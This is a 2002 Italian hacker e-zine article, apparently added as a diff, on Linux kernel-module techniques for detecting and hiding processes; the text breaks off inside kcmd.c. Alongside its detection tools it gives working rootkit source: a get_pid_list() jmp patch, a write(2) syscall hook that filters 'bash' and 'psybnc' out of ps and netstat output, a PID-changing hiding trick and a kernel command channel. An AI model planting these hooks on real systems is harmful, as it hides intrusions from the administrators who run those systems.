@@ -1,0 +1,1335 @@
+==============================================================================
+--------------------[ BFi11-dev - file 09 - 23/04/2002 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ KERNEL HACKiNG: NU0VE TECNiCHE PER iL DETECT E L'0CCULTAMENT0
+-----[ xenion <xenion@acidlife.com>
+
+
+
+In questo articolo ho raccolto miei tools e idee riguardanti LKM e Kernel 
+per Linux.. non tratta quindi un argomento particolare.
+Per chiarimenti, idee, bug fixes o altro: xenion@acidlife.com
+Con questo penso di aver detto tutto, buona lettura :)
+
+==============================================================================
+
+1 ]-- Detect di processi nascosti e syscall hookate
+
+1.1 - Come vedere i processi nascosti da hooks della getdents(2) da userspace
+1.2 - psmod, task list viewer
+1.3 - printf anti-write-hook
+1.4 - Syscall Benchmark
+
+2 ]-- Idee varie
+
+2.1 - Modificare la get_pid_list() per nascondere i task
+2.2 - Nuova implementazione dell' hook della write(2)
+2.3 - Cambiare il PID dei processi a runtime
+
+3 ]-- Tools
+
+3.1 - Kdump: Dump Kernel space memory
+3.2 - modkiller: evitiamo qualche machine lock
+3.3 - kcmd/ucmd: mandare richieste e ricevere risposte tra user e kernel space
+
+4 ]-- *.c List
+
+      xe@gw:$ ls *.c
+      hprintf.c  kdump.c      pidlist.c  uahah.c  wbench.c
+      kcmd.c     modkiller.c  psmod.c    ucmd.c   writehook.c
+      xe@gw:$
+
+
+==============================================================================
+
+1.1 - Come vedere i processi nascosti da hooks della getdents(2) da userspace
+
+
+I processi vengono nascosti sempre nello stesso modo, hookando la syscall
+getdents(2) senza fare molto altro.. vediamo velocemente come:
+
+In Linux ps utilizza il fs /proc/ per chiedere al Kernel le informazioni
+sui processi. Ogni processo ha la sua directory /proc/PIDprocesso/ dove 
+sono contenute tutte le informazioni relative al suo stato. 
+mediante strace(1) sappiamo che ps fa uso della getdents(2), che gli rende 
+disponibile la lista dei file (e quindi anche delle directory) in /proc/.
+Se alteriamo il funzionamento della getdents(2) filtrando /proc/PIDprocesso/
+il processo risultera' invisibile a ps.
+
+Se in qualche modo riusciamo a fare a meno della getdents(2) (e questo e' 
+possibile) questo sistema non sara' piu sufficiente :)
+Vediamo come: facciamo un piccolo tool che prova ad aprire /proc/PID/cmdline,
+con PID che varia da 1 a PID_MAX (0x8000). Se la open(2) non fallisce, il
+processo esiste. In modo analogo si potrebbe usare anche la chdir(2) o altre
+syscall che fanno riferimento al pid. 
+Ecco un tool che fa esattamente questo utilizzando la open(2):
+
+<-| pidlist.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdarg.h>
+#include <sys/types.h>
+#include <string.h>
+
+#define PID_MAX 0x8000
+
+int
+main()
+{
+    pid_t           pid;
+    FILE           *f;
+    char            buf[100];
+    char           *p;
+
+    printf("PID\tCMD\n");
+
+    for (pid = 1; pid <= PID_MAX; ++pid) {
+
+        p = buf;
+
+        sprintf(buf, "/proc/%d/cmdline", pid);
+        if ((f = fopen(buf, "r")) == NULL)
+            continue;
+        if (fgets(buf, sizeof buf, f) == NULL)
+            *buf = '\0';
+        fclose(f);
+
+        if (strlen(buf) == 0) {
+            sprintf(buf, "/proc/%d/status", pid);
+            if ((f = fopen(buf, "r")) == NULL)
+                continue;
+            if (fgets(buf, sizeof buf, f) == NULL) {
+                fclose(f);
+                continue;
+            }
+            if (strlen(buf) <= 8) {
+                continue;
+                fclose(f);
+            }
+            *index(buf, '\n') = '\0';
+            *(p + 5) = '[';
+            p += 5;
+            strcat(p, "]");
+            fclose(f);
+        }
+
+        printf("%d\t%s\n", pid, p);
+
+    }
+
+    return 0;
+}
+<-X->
+
+vediamo come funziona:
+
+xe@gw:$ ./pidlist
+PID     CMD
+1       init
+2       [keventd]
+3       [ksoftirqd_CPU0]
+..
+2063    ./pidlist
+xe@gw:$
+
+==============================================================================
+
+1.2 - psmod, task list viewer
+
+
+I task vengono gestiti dal Kernel mediante una lista circolare doppia, ogni
+elemento e' una struttura di tipo task_struct, definito in
+/usr/include/linux/sched.h. 
+Un modulo che utilizza direttamente questa lista fornira' quindi informazioni
+certamente piu sicure dei normali tool a user space. 
+psmod rende disponibile a userspace le informazioni direttamente prese dalla
+lista dei task servendosi di /proc/psmod:
+
+<-| psmod.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/proc_fs.h>
+#include <asm/uaccess.h>
+
+
+struct proc_dir_entry *ps_proc;
+
+
+int
+proc_list(char *buf, char **start, off_t offset, int count,
+	  int *eof, void *data)
+{
+    struct task_struct *tsk;
+
+    count = 0;
+
+    for_each_task(tsk)
+	count +=
+	sprintf(buf + count, "%d\t%s\n", (int) tsk->pid, tsk->comm);
+
+    return count;
+}
+
+
+int
+init_module(void)
+{
+
+    console_print("psmod loaded.\n");
+
+    if ((ps_proc =
+	 create_proc_entry("psmod", S_IFREG | S_IRUGO, NULL)) != NULL)
+	ps_proc->read_proc = proc_list;
+
+    return 0;
+}
+
+
+void
+cleanup_module(void)
+{
+
+    remove_proc_entry("psmod", NULL);
+    console_print("psmod removed.\n");
+
+}
+<-X->
+
+vediamo come funziona:
+
+xe@gw:$ insmod psmod.o
+psmod loaded.
+xe@gw:$ cat /proc/psmod
+1       init
+2       keventd
+3       kapm-idled
+..
+255     cat
+xe@gw:$
+
+Senza utilizzare moduli, e' sufficiente abilitare nel Kernel il
+"Magic SysRq key" (Menu "Kernel hacking") ed utilizzare il comando 't'.
+
+==============================================================================
+
+1.3 - printf anti-write-hook
+
+
+Molti hook della write(2) funzionano nel medesimo modo: un strncmp() del
+buffer passato decide se chiamare o no la vera write(2). 
+E' sufficiente una diversa implementazione della printf(1) per mettere
+in crisi questo sistema: mandiamo alla write(2) un byte alla volta :^)
+
+<-| hprintf.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+/*
+ * works with some write(2) hooks 
+ */
+
+#include <stdarg.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+extern int      vasprintf();
+int             hprintf(char *, ...);
+
+int
+main()
+{
+
+    hprintf("HIDDEN_TEXT will be visible\n");	// will be visible
+    printf("HIDDEN_TEXT will be hidden\n");	// will be hidden
+    return 0;
+
+}
+
+int
+hprintf(char *pattern, ...)
+{
+
+    char           *s;
+    va_list         ap;
+    int             len,
+                    i,
+                    z;
+
+    va_start(ap, pattern);
+    len = vasprintf(&s, pattern, ap);
+    va_end(ap);
+
+    if (len > 0) {
+	for (i = 0; i < len; i++) {
+	    z = write(1, s + i, 1);
+	}
+	free(s);
+    }
+
+    return len;
+}
+<-X->
+
+==============================================================================
+
+1.4 Syscall Benchmark
+
+
+Una syscall hookata sara' sempre e comunque piu lenta della syscall originale,
+possiamo quindi fare dei Benchmark sulla velocita' delle syscall per 
+verificarne l'originalita'. Il seguente tool e' un Benchmark per la write(2):
+
+<-| wbench.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/times.h>
+
+#define BUF "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+int
+main(int argc, char **argv)
+{
+    struct tms      start,
+                    end;
+    unsigned long   loop;
+
+    if (argc < 2) {
+	printf
+	    ("Measures the amount of CPU time spent executing a write(2) loop.\n");
+	printf("(may be used to detect a possible write syscall hook)\n");
+	printf("usage: %s <times to loop>\n\n", argv[0]);
+	exit(0);
+    }
+
+    loop = atol(argv[1]);
+
+    printf("loop %ld times\n", loop);
+
+    times(&start);
+
+    while (loop--)
+	write(3, BUF, sizeof BUF);
+
+    times(&end);
+
+    printf("Execution time: %ld jiffies.\n",
+	   (end.tms_utime - start.tms_utime) + (end.tms_stime -
+						start.tms_stime));
+
+    return 0;
+
+}
+<-X->
+
+Testiamo ora il nostro wbench con il famoso adore dei Teso:
+
+xe@gw:$ ./wbench 1000000
+loop 1000000 times
+Execution time: 112 jiffies.
+xe@gw:$ cd adore/
+xe@gw:$ ./startadore
+xe@gw:$ ../wbench 1000000
+loop 1000000 times
+Execution time: 132 jiffies.
+xe@gw:$
+
+uhm, funziona :)
+
+==============================================================================
+
+2.1 - Modificare la get_pid_list() per nascondere i task
+
+
+Le syscall usano delle funzioni interne del Kernel per funzionare.
+Buchiamo queste funzioni e faremo vedere alle syscall quello che ci pare, 
+filtrando quello che vogliamo nascondere. Proviamo a occultare i processi
+in questo modo: la funzione che ci interessa e' get_pid_list(), definita in
+/usr/src/linux/fs/proc/base.c.
+Per trovare la posizione esatta della funzione in Kernel space possiamo usare
+objdump:
+
+xe@gw:$ objdump -d vmlinux | grep "<get_pid_list>"
+00000000c014d00c <get_pid_list>:
+    c014d0b8:   e8 4f ff ff ff          call   c014d00c <get_pid_list>
+xe@gw:$
+ 
+Ora abbiamo tutto quello che ci occorre: in 0xc014d00c mettiamo un jmp
+alla nostra get_pid_list() modificata e il gioco e' fatto :D
+Il seguente modulo fa questo:
+
+<-| uahah.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <asm/uaccess.h>
+
+#define PROC_MAXPIDS 20 /* defined in /usr/src/linux/fs/proc/base.c */
+#define GETPIDLIST (unsigned char *)0xc014d00c  /* get_pid_list() position */
+
+unsigned char   jmp_to_hooked[] = "\xb8\x0\x0\x0\x0"    /* mov 0x0,%eax */
+                                  "\xff\xe0";           /* jmp %eax */
+
+unsigned char   backup[sizeof jmp_to_hooked];
+
+
+/*
+ * our new implementation of the get_pid_list() function
+ */
+
+static int
+hooked(int index, unsigned int *pids)
+{
+    struct task_struct *p;
+    int             nr_pids = 0;
+
+    index--;
+    read_lock(&tasklist_lock);
+    for_each_task(p) {
+        int             pid = p->pid;
+        if (!pid)
+            continue;
+        if (--index >= 0)
+            continue;
+
+        /*
+         * <added>
+         */
+        printk(KERN_ALERT "task name: '%s' (pid:%d) on pid %d\n",
+               current->comm, current->pid, pid);
+        /*
+         * </added>
+         */
+
+        pids[nr_pids] = pid;
+        nr_pids++;
+        if (nr_pids >= PROC_MAXPIDS)
+            break;
+    }
+    read_unlock(&tasklist_lock);
+    return nr_pids;
+}
+
+int
+init_module(void)
+{
+
+    int             i;
+
+    unsigned long   addr = (long) hooked;
+
+    console_print("uahah loaded\n");
+
+    for (i = 0; i < 4; ++i)
+        jmp_to_hooked[i + 1] = *((unsigned char *) &addr + i);
+
+    for (i = 0; i < sizeof jmp_to_hooked; ++i) {
+        backup[i] = *(GETPIDLIST + i);
+        *(GETPIDLIST + i) = jmp_to_hooked[i];
+    }
+
+    return 0;
+
+}
+
+void
+cleanup_module(void)
+{
+
+    int             i;
+
+    for (i = 0; i < sizeof jmp_to_hooked; ++i)
+        *(GETPIDLIST + i) = backup[i];
+
+    console_print("uahah removed\n");
+
+}
+<-X->
+
+..non ci resta che provarlo:
+
+xe@gw:$ insmod uahah.o
+uahah loaded
+xe@gw:$ ps
+..
+task name: 'ps' (pid:1807) on pid 322
+task name: 'ps' (pid:1807) on pid 323
+task name: 'ps' (pid:1807) on pid 324
+  PID TTY          TIME CMD
+  322 tty3     00:00:00 bash
+..
+task name: 'ps' (pid:1807) on pid 1807
+ 1807 tty3     00:00:00 ps
+xe@gw:$ rmmod uahah
+uahah removed
+xe@gw:$
+
+funziona :D 
+Ora possiamo nascondere processi senza hookare la solita getdents(2) :)
+
+==============================================================================
+
+2.2 - Nuova implementazione dell' hook della write(2)
+
+
+Rootkit come adore implementano un'hook della write(2) buggato: Non tengono
+conto del fatto che i pipe non sono line-buffered (sulla mia box hanno un
+buffer di 4096 byte) e che quindi un semplice e veloce strncmp() non e'  
+sufficiente.
+Si potranno verificare tre situazioni indesiderate:
+- Se nel blocco e' presente la stringa da nascondere, verra' nascosto l'intero
+  blocco (quindi molte righe di output che dovrebbero venire visualizzate..).
+- Se la dimensione dell'output e' <= della dimensione del buffer del pipe 
+  ed e' presente la stringa da nascondere, *tutto* l'output verra' nascosto
+- Probabilmente ogni blocco conterra' due righe spezzate (la fine dell'ultima
+  riga del blocco precendente e l'inizio della riga del prossimo blocco).
+  L'output di ps potrebbe apparire cosi':
+
+  ..
+  533 ?        S      0:00 httpd
+   0:00 xfs -droppriv -daemon -port -1
+  599 tty5     SW     0:00 [mingetty]
+  ..
+
+Il seguente hook della write(2) risolve in parte il problema:
+Le righe spezzate verranno nascoste, quindi ogni blocco di dati avra' una
+riga nascosta di troppo.. e infine se due utenti nello stesso istante eseguono
+un comando il cui output viene filtrato, e' possibile che torni il problema 
+delle mezze righe.
+
+<-| writehook.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/malloc.h>
+#include <linux/string.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+extern void    *sys_call_table[];
+
+
+char           *HIDETO[] = {
+    "ps",
+    "netstat",
+    NULL
+};
+
+char           *HIDETHIS[] = {
+    "bash",
+    "psybnc",
+    NULL
+};
+
+
+int             (*o_write) (unsigned int, char *, size_t);
+int             was_endline;
+
+int             n_write(unsigned int, char *, size_t);
+
+
+int
+init_module(void)
+{
+
+    was_endline = 1;
+    o_write = sys_call_table[__NR_write];
+    sys_call_table[__NR_write] = n_write;
+    console_print("write hook loaded.\n");
+    return 0;
+
+}
+
+
+void
+cleanup_module(void)
+{
+
+    sys_call_table[__NR_write] = o_write;
+    console_print("write hook removed.\n");
+
+}
+
+
+int
+n_write(unsigned int fd, char *buf, size_t count)
+{
+    char           *kbuf,
+                   *start,
+                   *end;
+    int             r,
+                    i,
+                    z;
+    size_t          mycount,
+                    tmp;
+
+
+    for (z = 0, i = 0; HIDETO[i]; ++i)
+	if (strcmp(current->comm, HIDETO[i]) == 0)
+	    z++;
+
+    if (z == 0) {
+	r = o_write(fd, buf, count);
+	return r;
+    }
+
+    kbuf = (char *) kmalloc(count, GFP_KERNEL);
+    if (kbuf == NULL) {
+	r = o_write(fd, buf, count);
+	return r;
+    }
+
+    copy_from_user(kbuf, buf, count);
+
+    start = kbuf;
+    mycount = count;
+
+    if (!was_endline)
+	for (tmp = 0; tmp < count; ++tmp)
+	    if (kbuf[tmp] == '\n') {	/* tmp==count-1 */
+		start = &kbuf[tmp] + 1;	/* -> start = kbuf+tmp+1 */
+		mycount -= tmp + 1;	/* -> mycount-= count */
+		break;		/* this isn't a bug */
+	    }
+
+    for (tmp = count; tmp > 0; tmp--)
+	if (kbuf[tmp - 1] == '\n')
+	    break;
+
+    was_endline = count == tmp ? 1 : 0;
+
+    mycount -= count - tmp;
+
+    while ((end = memchr(start, '\n', mycount)) != NULL) {
+	tmp = end - start + 1;
+
+	*end = '\0';
+	for (z = 0, i = 0; HIDETHIS[i]; ++i)
+	    if (strstr(start, HIDETHIS[i]))
+		z++;
+	*end = '\n';
+
+	if (z == 0) {
+	    copy_to_user(buf, start, tmp);
+	    r = o_write(fd, buf, tmp);
+	    if (r == -1)
+		break;
+	}
+
+	mycount -= tmp;
+	start = ++end;
+    }
+
+    kfree(kbuf);
+    return count;
+
+}
+<-X->
+
+==============================================================================
+
+2.3 - Cambiare il PID dei processi a runtime
+
+
+Giocando con kcmd\ucmd, ho provato a cambiare il PID ad un processo.
+Risultato: ps non vede piu il processo :D 
+
+xe@gw:$ insmod kcmd.o
+kcmd loaded.
+xe@gw:$ ps
+  PID TTY          TIME CMD
+ 7398 pts/1    00:00:00 bash
+ 7402 pts/1    00:00:00 ps
+xe@gw:$ ./ucmd CPID
+Sending Request..
+received: [oldPID:7398, newPID:100. PID changed!]
+xe@gw:$ ps
+  PID TTY          TIME CMD
+ 7404 pts/1    00:00:00 ps
+xe@gw:$ ps ax | grep 7398
+xe@gw:$ cd /proc/
+xe@gw:$ ls -1 | grep 100
+100
+xe@gw:$ ls -la 100
+ls: 100: No such file or directory
+xe@gw:$
+
+La getdents(2) vede la directory del PID ma la stat(2) fallisce.. 
+andiamo a vedere nei sources di ps, precisamente in
+procps-2.0.7/proc/readproc.c :
+
+        while ((ent = readdir(PT->procfs)) &&
+               (*ent->d_name < '0' || *ent->d_name > '9'))
+            ;
+        if (!ent || !ent->d_name)
+            return NULL;
+        sprintf(path, "/proc/%s", ent->d_name);
+
+    if (stat(path, &sb) == -1)          /* no such dirent (anymore) */
+        goto next_proc;
+
+Siccome la stat(2) fallisce, ps salta silenziosamente il processo.
+Un processo occultato in questo modo ha grosse limitazioni, molte syscall
+non funzioneranno perche si basano sul PID. Quando il processo termina sembra
+che anche il padre muoia.. ma non'ho controllato a fondo questi particolari.
+Per nascondere anche alla getdents(2) il task basta settare il PID a 0,
+il PID dello swapper. Se si setta il PID a 0 e se il task termina senza prima 
+ripristinare il PID originale, la box si locka con un "Kernel panic: 
+Attempted to kill the idle task!". Attenti quindi..^^
+
+==============================================================================
+
+3.1 - Kdump: Dump Kernel space memory
+
+
+veloce e semplice utility che permette di dumpare la memoria in kernelspace.
+
+<-| kdump.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdarg.h>
+
+#define KMEM "/dev/kmem"
+#define NBYTES 20
+#define VERSION "1.0"
+
+void            fatal(char *, ...);
+
+int
+main(int argc, char **argv)
+{
+    int             fd;
+    unsigned char   data;
+    off_t           addr,
+                    length,
+                    i,
+                    j;
+
+    if (argc < 3) {
+        printf("Kdump v%s\n", VERSION);
+        printf("USAGE: kdump <addr> <length>\n\n");
+        exit(1);
+    }
+
+    addr = strtoul(argv[1], NULL, 0);
+    length = strtoul(argv[2], NULL, 0);
+
+    printf("Dumped memory from <%#lx> to <%#lx+%lu>\n\n", addr, addr,
+           length);
+
+    if ((fd = open(KMEM, O_RDONLY)) == -1)
+        fatal("open()");
+
+    if (lseek(fd, addr, SEEK_SET) == -1)
+        fatal("lseek()");
+
+    for (i = 0; i < length; i += NBYTES) {
+        printf("%#lx+%-8lu", addr, i);
+        for (j = 0; j < NBYTES && (i + j) < length; j++) {
+            if (read(fd, &data, 1) < 1)
+                fatal("read()");
+            printf(" %.2x", data);
+        }
+        printf("\n");
+    }
+
+    close(fd);
+    return 0;
+
+}
+
+
+void
+fatal(char *pattern, ...)
+{
+    va_list         ap;
+    va_start(ap, pattern);
+
+    vfprintf(stderr, pattern, ap);
+    fprintf(stderr, "; exit forced.\n");
+
+    va_end(ap);
+    exit(1);
+
+}
+<-X->
+
+..vediamo come funziona:
+
+xe@gw:$ ./kdump 0xC0000000 100
+Dumped memory from <0xc0000000> to <0xc0000000+100>
+
+0xc0000000+0        01 00 00 00 d0 e7 00 f0 c3 e2 00 f0 d0 e7 00 f0 d0 e7 00 f0
+0xc0000000+20       54 ff 00 f0 08 80 00 f0 d0 e7 00 f0 a5 fe 00 f0 87 e9 00 f0
+0xc0000000+40       6f ef 00 f0 6f ef 00 f0 6f ef 00 f0 6f ef 00 f0 57 ef 00 f0
+0xc0000000+60       6f ef 00 f0 c6 56 00 c0 4d f8 00 f0 41 f8 00 f0 44 97 00 f0
+0xc0000000+80       39 e7 00 f0 59 f8 00 f0 2e e8 00 f0 d2 ef 00 f0 a4 e7 00 f0
+xe@gw:$
+
+==============================================================================
+
+3.2 - modkiller: evitiamo qualche machine lock
+
+
+Quando si programmano hook, basta un bug per lockare la box.
+Ci sono due sistemi per ovviare a questo problema: le VirtualMachines
+o modkiller :).  Sicuramente meno potente e meno sicuro, funzionera' solo
+in alcuni casi, in altri sara' inutile (da un Kernel panic non si scappa).
+Mi e' stato comunque molto utile quando giocavo con la execve(2), mi ha
+evitato molti reboot.
+Funzionamento: installa un Kernel timer, quando l'handler viene eseguito
+viene scaricato il modulo X (e quindi viene eseguita la sua cleanup_module()).
+In altre parole un rmmod alternativo da Kernelspace. La cleanup_module()
+non deve contenere errori e deve annullare qualsiasi modifica, altrimenti
+modkiller diventa inutile.. 
+
+<-| modkiller.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <asm/uaccess.h>
+#include <sys/syscall.h>
+#include <linux/sched.h>
+#include <linux/timer.h>
+
+#define THIS_MODULE_NAME (char *)__this_module.name
+
+extern void    *sys_call_table[];
+
+static struct timer_list s_mytimer;
+static char    *mod;
+static int      timeout;
+
+static void     mytimer_proc(unsigned long ptr);
+static void     add_mytimer(void);
+static void     del_mytimer(void);
+static int      kdelete_module(char *);
+
+MODULE_PARM(mod, "s");
+MODULE_PARM(timeout, "i");
+
+int
+init_module(void)
+{
+    printk(KERN_ALERT "%s: Loaded (mod=%s,timeout=%ds)\n",
+	   THIS_MODULE_NAME, mod, timeout);
+
+    if (!mod || timeout <= 0) {
+	printk(KERN_ALERT
+	       "%s: Next time, do insmod mod=<module name> timeout=<timeout (s)>\n",
+	       THIS_MODULE_NAME);
+	return -EINTR;
+    } else {
+	add_mytimer();
+	printk(KERN_ALERT "%s: Running..\n", THIS_MODULE_NAME);
+    }
+
+    return 0;
+
+}
+
+
+void
+cleanup_module(void)
+{
+
+    printk(KERN_ALERT "%s: bye\n", THIS_MODULE_NAME);
+    del_mytimer();
+
+}
+
+
+int
+kdelete_module(char *name)
+{
+
+    int             (*sys_delete_module) (char *) =
+	sys_call_table[__NR_delete_module];
+    mm_segment_t    old_fs = get_fs();
+    int             z;
+
+    set_fs(get_ds());
+    z = sys_delete_module(name);
+    set_fs(old_fs);
+
+    return z;
+
+}
+
+
+void
+mytimer_proc(unsigned long ptr)
+{
+
+    if (kdelete_module(mod) == 0)
+	printk(KERN_ALERT "%s: module '%s' removed\n", THIS_MODULE_NAME,
+	       mod);
+    else
+	printk(KERN_ALERT "%s: unable to remove '%s'\n",
+	       THIS_MODULE_NAME, mod);
+
+    printk(KERN_ALERT "%s: now remove me with '/sbin/rmmod %s'\n",
+	   THIS_MODULE_NAME, THIS_MODULE_NAME);
+
+}
+
+void
+add_mytimer(void)
+{
+
+    init_timer(&s_mytimer);
+    s_mytimer.function = mytimer_proc;
+    s_mytimer.expires = jiffies + HZ * timeout;
+    add_timer(&s_mytimer);
+
+}
+
+void
+del_mytimer(void)
+{
+
+    del_timer(&s_mytimer);
+
+}
+<-X->
+
+..vediamo come si usa:
+
+xe@gw:$ insmod modkiller.o mod=uahah timeout=10
+modkiller: Loaded (mod=uahah,timeout=10s)
+modkiller: Running..
+xe@gw:$ insmod uahah.o
+uahah loaded
+xe@gw:$ uahah removed
+modkiller: module 'uahah' removed
+modkiller: now remove me with '/sbin/rmmod modkiller'
+xe@gw:$ rmmod modkiller
+modkiller: bye
+xe@gw:$
+
+
+==============================================================================
+
+3.3 - kcmd/ucmd: mandare richieste e ricevere risposte tra user e kernel space
+
+
+Utilizziamo la write(2) come syscall di input e output allo stesso tempo, 
+questo ci semplifica la comunicazione tra user e kernel space.
+Ecco il modulo:
+
+<-| kcmd.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#define MODULE
+#define __KERNEL__
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/malloc.h>
+#include <linux/string.h>
+#include <sys/syscall.h>
+#include <asm/uaccess.h>
+
+#define MAGICFD -1337
+#define KEY "IMightBeWrong"
+#define BUFLEN 1024
+
+extern void    *sys_call_table[];
+
+int             (*o_write) (int, char *, size_t);
+
+int
+n_write(int fd, char *buf, size_t count)
+{
+    char           *cmd,
+                   *kbuf = NULL;
+    int             found = 0;
+
+
+    if (fd == MAGICFD) {
+
+	if (count < BUFLEN)
+	    goto out;
+
+	if ((kbuf = (char *) kmalloc(count, GFP_KERNEL)) == NULL)
+	    goto out;
+
+	copy_from_user(kbuf, buf, count);
+
+	if (strncmp(kbuf, KEY, sizeof KEY) != 0)
+	    goto out;
+
+	cmd = kbuf + sizeof KEY;
+
+	if (strcmp(cmd, "PID") == 0) {
+	    sprintf(kbuf, "your PID is %d", current->pid);
+	    ++found;
+	}
+
